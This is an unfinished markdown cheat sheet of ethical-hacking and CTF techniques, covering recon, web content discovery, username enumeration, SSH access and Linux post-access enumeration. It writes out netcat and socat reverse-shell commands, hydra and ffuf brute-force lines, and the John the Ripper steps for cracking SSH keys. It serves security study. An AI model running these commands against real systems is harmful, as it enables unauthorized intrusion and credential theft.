<h1 color=#feffff> EHR - Ethical Hacking Repository </h1>

A definitive guide to Ethical Hacking


# Information Gathering

## Passive Information Gathering

- **whois**: $ whois targetdomain.com
- **nslookup**: $ nslookup -type=[T] targetdomain.com [optional-resolver]
      
     | [T]   | Result             |
     |-------|--------------------|
     | A     | IPv4 Addresses     |
     | AAAA  | IPv6 Addresses     |
     | CNAME | Canonical Name     |
     | MX    | Mail Servers       |
     | SOA   | Start of Authority |
     | TXT   | TXT Records        |
      
- **dig**: $ dig [@optional-resolver] targetdomain.com [T]
- **DNSDumpster**

## Active Information Gathering

### Manual Active Inf. G.

- **ping**: $ ping -n 10 [target_ip]
- **traceroute**: $ traceroute [target_ip or domain name]
- **telnet**: $ telnet [target_ip] [port]

### Automated Active Inf. G.

- **nmap**: $ nmap -A -T4 [target_ip] 

# Enumeration/Scanning

## Pre-Access

### Web Content Discovery

- Check http:/targetsite.com/robots.txt for hidden folders or files;
- Check http:/targetsite.com/sitemap.xml for website architecture and hidden areas;
- Check HTTP Response Header fields such as: "Server" (OS and version) and "X-Powered-By" (web langauge version);
- Check Framework Stack version and vulnerabilities;
- Google Dorking:
      
     | Filter   | Example             | Description                                      |
     |----------|---------------------|--------------------------------------------------|
     | site     | site:targetsite.com | results only from specified URL                  |
     | inurl    | inurl:admin         | results that have specified word in URL          |
     | filetype | filetype:pdf        | results which are a particular type of file ext. |
     | intitle  | intitle:admin       | results that contain the specified word in title |

- Automated Content Discovery:

```bash

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http:/targetsite.com/ 

```

```bash 

gobuster -u http://targetsite.com -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,sh,txt,cgi,html,js,css

```

### Subdomain Enumeration

- Check TLS Certificate;
- Serach Engines, to reveal subdomains:
      - GOOGLE: -site:www.targetsite.com site:* .targetsite.com

- DNS Bruteforce:
           
      dnsrecon -d targetsite.com -D /usr/share/wordlists/dnsmap.txt -t std

### Username Enumeration

For Login forms, if the HTTP response returns a different answer for existing usernames rather than non existent:

    ffuf -w /usr/share/wordlists/[usernames.txt] -u http:/targetsite.com -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "name_parameter=FUZZ&password_parameter=randompass" -[mx] [number or "string for mr"]

Where the match criteria is used in order to print only some matching Responses:

   | [mx] | Result                                              |
   |------|-----------------------------------------------------|
   | mc   | Match code (200, 204, 301, 302, 307, 401, 403, 405) |
   | mw   | Match amount of words in response                   |
   | mr   | Match defined "string" in response                  |
   | ml   | Match amount of lines in response                   |
   | ms   | Match HTTP response size                            |

But you can also exploit the registration form where the "Username already exist" response will be provided.

# Gaining Access

## SSH

- After getting SSH usernames try to access the system bruteforcing it:

      hydra -l [username] -P /usr/share/wordlists/rockyou.txt ssh://[ip-address] -v

- If you can get the RSA private key of a user for ssh access: priv_rsa.txt, then you should derive the priv_rsa.hash to crack the passphrase for priv_rsa keygen.
      
      python3 ssh2john.py priv_rsa.txt > priv_rsa.hash
      
      john --wordlist=/usr/share/wordlists/rockyou.txt priv_rsa.hash
      
  Now you must reduce permissions on priv_rsa.txt
  
      chmod 400 priv_rsa.txt
      
  And then access the system.
  
      ssh -i priv_rsa.txt [username]@[ip-address]

## Getting a reverse shell

- **Netcat**: easy to istantiate but also to lose, requires stabilization:
      
      On target ---
      $ nc [listener ip] [listener port] -e /bin/bash
      $ mkfifo /tmp/f; nc [listener ip] [listener port] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
      
      On listener ---
      $ nc -nlvp [listener port]
      
- **Socat**: stronger but harder syntax, rarely installed, provides stabilized shell (Socat binary available [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true))

      On target ---
      $ socat TCP:[listener ip]:[listener port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
      
      On listener ---
      $ socat TCP-L:[port] FILE:`tty`,raw,echo=0
      
- **Metasploit**: sometimes banned from CTF environments

All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Shell Stabilization

### Python

- Check Python version and execute the command
  
      python -c 'import pty;pty.spawn("/bin/bash")'
    
- Get access to term commands

      export TERM=xterm
    
- Cntrl + Z

      stty raw -echo; fg 

### rlwrap

- Use rlwrap prepended nc command at the listener

      rlwrap nc -nlvp [port]

- Cntrl + Z

      stty raw -echo; fg

## Web Hacking

### Authenitcation Bypass

- Always look for .js or .php authentication scripts through Network tab (Advanced Tools F12), BurpSuite or Content Discovery. You could encounter authentication flaws.
- Check Cookies, try to decode them

### Brute Force

```bash

ffuf -w passwords.txt -X POST -d "username=username&password=password" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]

ffuf -w usernames.txt:W1,passwords.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]

```

Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the matching criteria. For example -fc 200 will return only answers with response codes different from 200 (e.g. 301 permanent redirects for correct login)

### IDOR

### LFI & RFI

### SSRF

### XSS

### Command Injection

### SQL Injection

## Post-Access

### Device enumeration

#### Manual Enumeration

- Hostname: $ hostname
- System information (Kernel Exploiting): $ uname -a
- Processes information: $ cat /proc/version
- OS version: $ cat /etc/os-release
- Processes List: $ ps aux
- Check root privileges on current user: $ sudo -l
- User privilege and membership: $ id
- Users on the system: $ cat /etc/passwd (Check also if it is writable)
- Existing communications: $ netstat -a; $ netstat -ano
- Look for interesting files:
         
      find / -name flag1.txt 2>/dev/null
         
- Find writable or executable folders:
      
      find / -perm -o w -type d 2>/dev/null
      
      find / -perm -o x -type d 2>/dev/nul
      
- Find SUID bit files (Executables with higher privileges):

      find / -perm -u=s -type f 2>/dev/null
        
- Check capabilities

      getcap -r / 2>/dev/null
        
- Check cronjobs

      cat /etc/crontab
        
- Check for writable folders in $PATH
- Check hidden files

      find / -name ".*" 2>/dev/null

#### Automated Tools

- [LinPeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
- [Linux Exploit Suggester](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh)
- [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
 
# Exploitation

## Kernel Exploitation

Once identified Kernel version, search for exploits for the kernel version of the target system and then run the snippet.

## FTP Exploitation

Check for anonymous access with "login: anonymous", then once accessed list elements in ftp folder and try to get them by means of "get filename.ext".
If ftp is set in [passive](https://www.jscape.com/blog/bid/80512/active-v-s-passive-ftp-simplified) mode then switch to active by typing "passive".

## SUID, SUDO, Capabilities exploitation

Get a way to exploit misconfigured linux systems by means of [GTFO bins](https://gtfobins.github.io/)

## Backup scripts exploitation

Check for backup scripts and check for write permissions.

## Docker exploitation



# Privilege Escalation

# Post-Exploitation


## Vulnerabilities

### Brute Force

#### Website Authentication bypass
